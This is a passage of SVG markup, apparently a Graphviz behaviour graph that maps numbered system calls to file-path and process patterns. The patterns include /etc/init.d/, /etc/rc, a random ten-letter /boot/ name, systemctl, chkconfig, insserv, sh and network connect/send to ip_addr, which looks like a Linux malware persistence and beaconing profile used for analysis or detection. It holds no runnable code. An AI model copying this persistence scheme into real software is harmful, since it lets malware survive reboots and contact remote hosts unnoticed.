font-size=\"14.00\">/boot/[a&#45;z]{10}</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.83,-263.38C2164.99,-260.97 1230.59,-251.21 1208.96,-229 1180.45,-199.72 1234.45,-187.57 1285.99,-182.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1286.59,-186 1296.24,-181.63 1285.97,-179.03 1286.59,-186\"/>\n<text text-anchor=\"middle\" x=\"1227.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.write</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.73,-263.28C2173.34,-260.57 1290.47,-250.1 1269.96,-229 1254.32,-212.92 1275.12,-200.73 1300.86,-192.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1301.94,-195.74 1310.51,-189.52 1299.93,-189.04 1301.94,-195.74\"/>\n<text text-anchor=\"middle\" x=\"1289.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.lseek</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.98,-263.16C2182.81,-260.15 1351.35,-248.97 1331.96,-229 1324.72,-221.55 1328.1,-212.04 1334.76,-203.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1337.57,-205.42 1341.57,-195.61 1332.33,-200.78 1337.57,-205.42\"/>\n<text text-anchor=\"middle\" x=\"1351.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.open</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.65,-263.57C2195.73,-261.93 1439.46,-254.83 1393.96,-229 1384.55,-223.66 1377.47,-214.29 1372.4,-205.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1375.54,-203.54 1367.98,-196.11 1369.26,-206.63 1375.54,-203.54\"/>\n<text text-anchor=\"middle\" x=\"1410.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">26.rm</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.7,-263.87C2212.88,-263.16 1543.69,-258.54 1449.96,-229 1438.32,-225.33 1437.45,-220.23 1426.96,-214 1418.53,-209 1409.34,-203.86 1400.6,-199.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1402.16,-195.98 1391.69,-194.34 1398.85,-202.15 1402.16,-195.98\"/>\n<text text-anchor=\"middle\" x=\"1473.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.clone</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.47,-264.63C2241.74,-265.72 1708.52,-265.02 1535.96,-229 1518.18,-225.29 1515.23,-219.61 1497.96,-214 1473.2,-205.96 1445.44,-198.54 1421.49,-192.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1422.03,-189.15 1411.48,-190.18 1420.37,-195.95 1422.03,-189.15\"/>\n<text text-anchor=\"middle\" x=\"1561.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">55.stat64</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1662.96\" cy=\"-178\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1662.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.38,-263.96C2225.04,-263.45 1624.15,-259.32 1594.96,-229 1582.09,-215.64 1598.58,-203.26 1618.54,-194.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1620.01,-197.34 1627.86,-190.23 1617.29,-190.89 1620.01,-197.34\"/>\n<text text-anchor=\"middle\" x=\"1617.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.lseek</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.7,-263.68C2237.22,-262.45 1690.97,-256.58 1663.96,-229 1658.15,-223.07 1656.54,-214.59 1656.8,-206.3\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1660.31,-206.43 1657.96,-196.1 1653.36,-205.64 1660.31,-206.43\"/>\n<text text-anchor=\"middle\" x=\"1686.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2443.23,-262.59C2261.32,-258.96 1814.24,-248.2 1748.96,-229 1728.27,-222.92 1707.3,-210.87 1691.25,-200.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1693.08,-197.14 1682.87,-194.34 1689.11,-202.9 1693.08,-197.14\"/>\n<text text-anchor=\"middle\" x=\"1771.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">15.write</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1833.96\" cy=\"-178\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1833.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.74,-263.07C2261.58,-260.51 1822.82,-251.95 1800.96,-229 1792.67,-220.3 1798.58,-209.27 1807.57,-199.78\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1810,-202.3 1814.86,-192.89 1805.19,-197.22 1810,-202.3\"/>\n<text text-anchor=\"middle\" x=\"1820.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">32.lstat</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.57,-263.91C2279.68,-263.15 1912.42,-258.17 1863.96,-229 1854.94,-223.58 1848.31,-214.32 1843.6,-205.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1846.72,-203.63 1839.37,-195.99 1840.35,-206.54 1846.72,-203.63\"/>\n<text text-anchor=\"middle\" x=\"1886.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.write</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2443.25,-262.3C2311.4,-258.85 2047.25,-249.58 1956.96,-229 1925.01,-221.72 1890.62,-207.11 1866.35,-195.56\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1867.78,-192.36 1857.25,-191.14 1864.72,-198.65 1867.78,-192.36\"/>\n<text text-anchor=\"middle\" x=\"1973.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.rm</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1986.96\" cy=\"-178\" rx=\"100.98\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1986.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">permission(s|:)[0&#45;9]{1,4}</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.83,-263.42C2307.39,-261.73 2037.88,-255.08 2003.96,-229 1996.75,-223.46 1992.57,-214.7 1990.16,-206.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1993.56,-205.22 1988.07,-196.16 1986.71,-206.67 1993.56,-205.22\"/>\n<text text-anchor=\"middle\" x=\"2030.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.umask</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2180.96\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2180.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2442.61,-263.65C2319.45,-262.28 2090.02,-256.07 2064.96,-229 2060.43,-224.11 2060.98,-219.35 2064.96,-214 2074.1,-201.69 2110.46,-192.05 2140.07,-186.03\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2141.06,-189.4 2150.2,-184.05 2139.72,-182.53 2141.06,-189.4\"/>\n<text text-anchor=\"middle\" x=\"2092.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2443.09,-262.29C2338.7,-259.17 2162.74,-250.71 2142.96,-229 2134.27,-219.47 2141.72,-208.07 2152.26,-198.56\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2154.74,-201.06 2160.28,-192.03 2150.32,-195.63 2154.74,-201.06\"/>\n<text text-anchor=\"middle\" x=\"2170.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2443.95,-261.63C2368.22,-258.12 2258.04,-249.56 2220.96,-229 2210.64,-223.28 2202.01,-213.71 2195.43,-204.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2198.18,-202.29 2189.77,-195.85 2192.33,-206.13 2198.18,-202.29\"/>\n<text text-anchor=\"middle\" x=\"2257.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2454.81,-255.18C2418.28,-249.41 2372.11,-240.75 2331.96,-229 2314.93,-224.02 2311.68,-219.94 2294.96,-214 2269.92,-205.1 2241.33,-196.33 2219.05,-189.79\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2219.87,-186.38 2209.29,-186.95 2217.92,-193.11 2219.87,-186.38\"/>\n<text text-anchor=\"middle\" x=\"2354.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">19.open</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2519.96\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2519.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/sed</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2456.09,-254.75C2426.47,-249.02 2395.85,-240.54 2386.96,-229 2362.26,-196.97 2423.76,-185.46 2471.17,-181.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2471.65,-184.79 2481.34,-180.52 2471.1,-177.81 2471.65,-184.79\"/>\n<text text-anchor=\"middle\" x=\"2408.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.fcntl</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2476.56,-250.04C2467.19,-244.93 2458.46,-238.09 2452.96,-229 2443.46,-213.32 2459.65,-200.94 2478.49,-192.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2479.94,-195.6 2487.85,-188.55 2477.27,-189.14 2479.94,-195.6\"/>\n<text text-anchor=\"middle\" x=\"2475.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.write</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2519.96,-246.8C2519.96,-235.16 2519.96,-219.55 2519.96,-206.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2523.46,-206.18 2519.96,-196.18 2516.46,-206.18 2523.46,-206.18\"/>\n<text text-anchor=\"middle\" x=\"2549.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">46.fchown</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2559.08,-249.34C2575.65,-240.69 2589.4,-228.57 2580.96,-214 2576.05,-205.53 2568.24,-198.93 2559.82,-193.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2561.39,-190.74 2550.92,-189.13 2558.1,-196.92 2561.39,-190.74\"/>\n<text text-anchor=\"middle\" x=\"2604.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.fstat</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2585.74,-255.5C2617.66,-248.47 2645.99,-235.93 2629.96,-214 2615.9,-194.78 2591.2,-185.86 2568.76,-181.82\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2569.07,-178.33 2558.66,-180.29 2568.02,-185.25 2569.07,-178.33\"/>\n<text text-anchor=\"middle\" x=\"2665.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">47.fchmod</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2853.96\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2853.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2581.19,-254C2616.21,-247.81 2660.81,-239.12 2699.96,-229 2739.49,-218.78 2783.75,-204.06 2814.64,-193.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2815.91,-196.5 2824.18,-189.87 2813.58,-189.89 2815.91,-196.5\"/>\n<text text-anchor=\"middle\" x=\"2791.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.2,-263.96C2677.31,-262.44 2795.84,-255.56 2831.96,-229 2839.62,-223.37 2844.65,-214.48 2847.94,-205.74\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2851.3,-206.72 2850.96,-196.13 2844.63,-204.62 2851.3,-206.72\"/>\n<text text-anchor=\"middle\" x=\"2875.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">66.connect</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge42\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2596.96,-262.57C2704.85,-259.76 2890.23,-251.66 2910.96,-229 2922.23,-216.67 2908.32,-204.28 2891.43,-194.92\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2892.94,-191.76 2882.44,-190.32 2889.75,-197.99 2892.94,-191.76\"/>\n<text text-anchor=\"middle\" x=\"2937.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3221.96\" cy=\"-178\" rx=\"53.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3221.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^systemctl$</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge43\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.41,-263.89C2686.7,-262.38 2837.4,-255.6 2963.96,-229 2983.76,-224.84 2987.34,-218.98 3006.96,-214 3058.54,-200.91 3118.38,-191.64 3161.81,-185.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3162.45,-189.38 3171.92,-184.64 3161.56,-182.44 3162.45,-189.38\"/>\n<text text-anchor=\"middle\" x=\"3046.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">72.setsockopt</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge44\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.29,-264.08C2730.52,-263.4 2997.52,-258.29 3085.96,-229 3097.54,-225.16 3097.91,-219.19 3108.96,-214 3128.28,-204.92 3150.54,-197.45 3170.16,-191.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3171.18,-195.12 3179.86,-189.05 3169.29,-188.38 3171.18,-195.12\"/>\n<text text-anchor=\"middle\" x=\"3154.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">73.getsockname</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge45\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.3,-264.53C2765.08,-265.04 3151.39,-262.5 3199.96,-229 3207.78,-223.6 3212.85,-214.76 3216.13,-206\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3219.51,-206.93 3219.11,-196.34 3212.82,-204.86 3219.51,-206.93\"/>\n<text text-anchor=\"middle\" x=\"3234.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.exec</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge46\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.03,-263.18C2781.97,-260.85 3237.35,-252.7 3259.96,-229 3268.17,-220.39 3262.47,-210.03 3253.23,-200.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3255.48,-198.29 3245.64,-194.36 3250.88,-203.57 3255.48,-198.29\"/>\n<text text-anchor=\"middle\" x=\"3303.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">71.getsockopt</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge47\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.24,-263.59C2798,-262.16 3322.23,-255.84 3347.96,-229 3372.06,-203.86 3326.2,-191.08 3283.2,-184.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3283.63,-181.29 3273.24,-183.41 3282.68,-188.23 3283.63,-181.29\"/>\n<text text-anchor=\"middle\" x=\"3378.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.wait4</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3452.96\" cy=\"-91\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3452.96\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^pipe($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge48\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.2,-263.3C2806.98,-261.1 3373.79,-252.94 3405.96,-229 3440.21,-203.5 3449.7,-151.56 3452.21,-119.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3455.71,-119.6 3452.82,-109.41 3448.72,-119.18 3455.71,-119.6\"/>\n<text text-anchor=\"middle\" x=\"3466.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.pipe</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3539.96\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3539.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge49\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.36,-263.52C2808.24,-261.87 3382.58,-255.02 3463.96,-229 3464.31,-228.89 3491.06,-211.27 3512.72,-196.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3514.88,-199.75 3521.3,-191.32 3511.02,-193.9 3514.88,-199.75\"/>\n<text text-anchor=\"middle\" x=\"3515.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">24.waitpid</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge50\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.48,-264.26C2830.75,-264.67 3512.17,-262.93 3544.96,-229 3550.97,-222.78 3551.57,-213.87 3550.06,-205.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3553.42,-204.34 3547.5,-195.56 3546.65,-206.12 3553.42,-204.34\"/>\n<text text-anchor=\"middle\" x=\"3574.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">23.clone</text>\n</g>\n<!-- 15 -->\n<g id=\"node16\" class=\"node\">\n<title>15</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3594.96\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3594.96\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge51\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.55,-264.41C2839.81,-265.32 3568.08,-265.03 3602.96,-229 3615.36,-216.19 3604.15,-100.44 3598.16,-46.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3601.61,-45.8 3597.01,-36.25 3594.65,-46.58 3601.61,-45.8\"/>\n<text text-anchor=\"middle\" x=\"3630.96\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n<!-- 16 -->\n<g id=\"node17\" class=\"node\">\n<title>16</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3672.96\" cy=\"-178\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3672.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/insserv</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge52\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.35,-263.56C2843.63,-261.89 3595.69,-254.7 3640.96,-229 3650.37,-223.66 3657.44,-214.29 3662.51,-205.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3665.66,-206.63 3666.93,-196.11 3659.38,-203.54 3665.66,-206.63\"/>\n<text text-anchor=\"middle\" x=\"3675.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.stat</text>\n</g>\n<!-- 17 -->\n<g id=\"node18\" class=\"node\">\n<title>17</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3758.96\" cy=\"-91\" rx=\"29.5\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3758.96\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/perl/</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge53\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.03,-263.24C2850.85,-260.55 3647.31,-250.42 3697.96,-229 3739.72,-211.34 3752.89,-154.31 3757.04,-119.64\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3760.57,-119.55 3758.1,-109.25 3753.61,-118.85 3760.57,-119.55\"/>\n<text text-anchor=\"middle\" x=\"3767.46\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.stat</text>\n</g>\n<!-- 18 -->\n<g id=\"node19\" class=\"node\">\n<title>18</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3915.96\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3915.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge54\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.62,-264.19C2847.22,-264.45 3618.95,-262.51 3725.96,-229 3737.6,-225.35 3737.68,-218.67 3748.96,-214 3791.62,-196.35 3844.25,-187.22 3878.88,-182.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3879.52,-186.22 3889.02,-181.54 3878.67,-179.27 3879.52,-186.22\"/>\n<text text-anchor=\"middle\" x=\"3767.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge55\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.39,-264.3C2854.97,-264.98 3673.02,-264.28 3785.96,-229 3797.61,-225.36 3797.95,-219.28 3808.96,-214 3831.98,-202.96 3859.37,-194.08 3880.67,-188.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3881.89,-191.32 3890.59,-185.28 3880.02,-184.57 3881.89,-191.32\"/>\n<text text-anchor=\"middle\" x=\"3834.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge56\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.29,-263.45C2873.94,-261.29 3801.11,-252.33 3859.96,-229 3867.88,-225.86 3882.34,-212.87 3894.57,-200.91\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3897.2,-203.24 3901.83,-193.7 3892.27,-198.27 3897.2,-203.24\"/>\n<text text-anchor=\"middle\" x=\"3903.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">59.write</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge57\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.23,-263.53C2888.47,-261.56 3904.56,-252.99 3927.96,-229 3934.37,-222.43 3933.69,-213.07 3930.59,-204.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3933.74,-202.71 3926.49,-194.98 3927.35,-205.54 3933.74,-202.71\"/>\n<text text-anchor=\"middle\" x=\"3969.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge58\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.09,-263.64C2899.12,-262.04 3986.04,-254.51 4010.96,-229 4032.29,-207.16 3987.41,-192.79 3952.33,-185.28\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3952.8,-181.81 3942.3,-183.26 3951.41,-188.67 3952.8,-181.81\"/>\n<text text-anchor=\"middle\" x=\"4039.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" 